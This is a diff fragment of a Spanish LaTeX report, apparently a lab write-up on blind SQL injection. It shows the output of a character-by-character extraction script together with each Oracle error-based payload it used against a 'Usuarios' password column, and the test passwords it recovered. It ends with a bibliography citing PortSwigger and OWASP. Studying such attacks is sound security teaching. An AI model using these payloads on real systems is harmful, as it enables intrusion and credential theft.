+ OK Carácter 10: '2' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 10, 1) = '2') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --
+ 
+ [+] Extrayendo carácter 11 de 11 para la fila 1...
+ OK Carácter 11: '3' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 11, 1) = '3') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --
+ [+] Valor extraído para la fila 1: password123
+ 
+ [+] Extrayendo datos para la fila 2...
+ 
+ [+] Determinando la longitud de 'password' para la fila 2...
+ FAIL Probando longitud 1 para la fila 2...
+ FAIL Probando longitud 2 para la fila 2...
+ FAIL Probando longitud 3 para la fila 2...
+ FAIL Probando longitud 4 para la fila 2...
+ FAIL Probando longitud 5 para la fila 2...
+ FAIL Probando longitud 6 para la fila 2...
+ FAIL Probando longitud 7 para la fila 2...
+ FAIL Probando longitud 8 para la fila 2...
+ OK Probando longitud 9 para la fila 2...
+ [*] La longitud de 'password' en la fila 2 es: 9
+ 
+ [+] Extrayendo el valor de 'password' para la fila 2...
+ 
+ [+] Extrayendo carácter 1 de 9 para la fila 2...
+ OK Carácter 1: 'p' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 1, 1) = 'p') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=2) = 1 --
+ 
+ [+] Extrayendo carácter 2 de 9 para la fila 2...
+ OK Carácter 2: 'a' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 2, 1) = 'a') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=2) = 1 --
+ 
+ [+] Extrayendo carácter 3 de 9 para la fila 2...
+ OK Carácter 3: 's' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 3, 1) = 's') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=2) = 1 --
+ 
+ [+] Extrayendo carácter 4 de 9 para la fila 2...
+ OK Carácter 4: 's' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 4, 1) = 's') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=2) = 1 --
+ 
+ [+] Extrayendo carácter 5 de 9 para la fila 2...
+ OK Carácter 5: 'w' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 5, 1) = 'w') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=2) = 1 --
+ 
+ [+] Extrayendo carácter 6 de 9 para la fila 2...
+ OK Carácter 6: 'o' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 6, 1) = 'o') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=2) = 1 --
+ 
+ [+] Extrayendo carácter 7 de 9 para la fila 2...
+ OK Carácter 7: 'r' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 7, 1) = 'r') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=2) = 1 --
+ 
+ [+] Extrayendo carácter 8 de 9 para la fila 2...
+ OK Carácter 8: 'd' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 8, 1) = 'd') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=2) = 1 --
+ 
+ [+] Extrayendo carácter 9 de 9 para la fila 2...
+ OK Carácter 9: '1' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 9, 1) = '1') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=2) = 1 --
+ [+] Valor extraído para la fila 2: password1
+ 
+ [+] Extrayendo datos para la fila 3...
+ 
+ [+] Determinando la longitud de 'password' para la fila 3...
+ FAIL Probando longitud 1 para la fila 3...
+ FAIL Probando longitud 2 para la fila 3...
+ FAIL Probando longitud 3 para la fila 3...
+ FAIL Probando longitud 4 para la fila 3...
+ FAIL Probando longitud 5 para la fila 3...
+ FAIL Probando longitud 6 para la fila 3...
+ FAIL Probando longitud 7 para la fila 3...
+ FAIL Probando longitud 8 para la fila 3...
+ OK Probando longitud 9 para la fila 3...
+ [*] La longitud de 'password' en la fila 3 es: 9
+ 
+ [+] Extrayendo el valor de 'password' para la fila 3...
+ 
+ [+] Extrayendo carácter 1 de 9 para la fila 3...
+ OK Carácter 1: 'p' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 1, 1) = 'p') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=3) = 1 --
+ 
+ [+] Extrayendo carácter 2 de 9 para la fila 3...
+ OK Carácter 2: 'a' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 2, 1) = 'a') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=3) = 1 --
+ 
+ [+] Extrayendo carácter 3 de 9 para la fila 3...
+ OK Carácter 3: 's' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 3, 1) = 's') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=3) = 1 --
+ 
+ [+] Extrayendo carácter 4 de 9 para la fila 3...
+ OK Carácter 4: 's' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 4, 1) = 's') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=3) = 1 --
+ 
+ [+] Extrayendo carácter 5 de 9 para la fila 3...
+ OK Carácter 5: 'w' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 5, 1) = 'w') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=3) = 1 --
+ 
+ [+] Extrayendo carácter 6 de 9 para la fila 3...
+ OK Carácter 6: 'o' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 6, 1) = 'o') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=3) = 1 --
+ 
+ [+] Extrayendo carácter 7 de 9 para la fila 3...
+ OK Carácter 7: 'r' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 7, 1) = 'r') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=3) = 1 --
+ 
+ [+] Extrayendo carácter 8 de 9 para la fila 3...
+ OK Carácter 8: 'd' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 8, 1) = 'd') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=3) = 1 --
+ 
+ [+] Extrayendo carácter 9 de 9 para la fila 3...
+ OK Carácter 9: '2' encontrado.
+ [+] Inyección utilizada: d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(password, 9, 1) = '2') THEN 1 ELSE 1/0 END FROM (SELECT password, ROWNUM AS rn FROM Usuarios) WHERE rn=3) = 1 --
+ [+] Valor extraído para la fila 3: password2
+ 
+ [+] Extrayendo datos para la fila 4...
+ 
+ [+] Determinando la longitud de 'password' para la fila 4...
+ FAIL Probando longitud 1 para la fila 4...
+ FAIL Probando longitud 2 para la fila 4...
+ FAIL Probando longitud 3 para la fila 4...
+ FAIL Probando longitud 4 para la fila 4...
+ FAIL Probando longitud 5 para la fila 4...
+ FAIL Probando longitud 6 para la fila 4...
+ FAIL Probando longitud 7 para la fila 4...
+ FAIL Probando longitud 8 para la fila 4...
+ FAIL Probando longitud 9 para la fila 4...
+ FAIL Probando longitud 10 para la fila 4...
+ FAIL Probando longitud 11 para la fila 4...
+ FAIL Probando longitud 12 para la fila 4...
+ FAIL Probando longitud 13 para la fila 4...
+ FAIL Probando longitud 14 para la fila 4...
+ FAIL Probando longitud 15 para la fila 4...
+ FAIL Probando longitud 16 para la fila 4...
+ FAIL Probando longitud 17 para la fila 4...
+ FAIL Probando longitud 18 para la fila 4...
+ FAIL Probando longitud 19 para la fila 4...
+ FAIL Probando longitud 20 para la fila 4...
+ FAIL Probando longitud 21 para la fila 4...
+ FAIL Probando longitud 22 para la fila 4...
+ FAIL Probando longitud 23 para la fila 4...
+ FAIL Probando longitud 24 para la fila 4...
+ FAIL Probando longitud 25 para la fila 4...
+ FAIL Probando longitud 26 para la fila 4...
+ FAIL Probando longitud 27 para la fila 4...
+ FAIL Probando longitud 28 para la fila 4...
+ FAIL Probando longitud 29 para la fila 4...
+ FAIL Probando longitud 30 para la fila 4...
+ FAIL Probando longitud 31 para la fila 4...
+ FAIL Probando longitud 32 para la fila 4...
+ FAIL Probando longitud 33 para la fila 4...
+ FAIL Probando longitud 34 para la fila 4...
+ FAIL Probando longitud 35 para la fila 4...
+ FAIL Probando longitud 36 para la fila 4...
+ FAIL Probando longitud 37 para la fila 4...
+ FAIL Probando longitud 38 para la fila 4...
+ FAIL Probando longitud 39 para la fila 4...
+ FAIL Probando longitud 40 para la fila 4...
+ [!] No se pudo determinar la longitud de 'password' en la fila 4.
+ [!] No se encontró longitud para la fila 4. Asumiendo fin de datos.
+ 
+ [+] Resultados completos:
+ Contraseña 1: password123
+ Contraseña 2: password1
+ Contraseña 3: password2
+ 
+ [+] Tiempo de ejecución: 190.46 segundos 
+\end{lstlisting}
+
+
+
 %Bibliografia (PortSwigger, OWASP, etc)
+\section{Bibliografía}
+\begin{small} % Cambia a \footnotesize si deseas un texto aún más pequeño
+\begin{itemize}
+    \item PortSwigger. (2021). SQL Injection. Recuperado de: \url{https://portswigger.net/web-security/sql-injection}
+    \item OWASP. (2021). SQL Injection. Recuperado de: \url{https://owasp.org/www-community/attacks/SQL_Injection}
+    \item OWASP. (2021). Blind SQL Injection. Recuperado de: \url{https://owasp.org/www-community/attacks/Blind_SQL_Injection}
+    \item OWASP. (2021). Time-Based Blind SQL Injection. Recuperado de: \url{https://owasp.org/www-community/attacks/Time-Based_Blind_SQL_Injection}
+    \item OWASP. (2021). SQL Injection Prevention Cheat Sheet.Recuperado de: \url{https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html}
+    \item Oracle. (2021). Oracle Database SQL Language Reference. Recuperado de: \url{https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/index.html}
+    \item PostgreSQL. (2021). PostgreSQL Documentation. Recuperado de: \url{https://www.postgresql.org/docs/}
+    \item W3Schools. (2021). SQL Tutorial. Recuperado de: \url{https://www.w3schools.com/sql/}
+    \item Burp Suite. (2021). Burp Suite Documentation. Recuperado de: \url{https://portswigger.net/burp/documentation}
+    \item Python. (2021). Python Documentation. Recuperado de: \url{https://docs.python.org/3/}
+    \item Stack Overflow. (2021). Recuperado de: \url{https://stackoverflow.com/}
+\end{itemize}
+\end{small}
+
+
 
 \end{document}
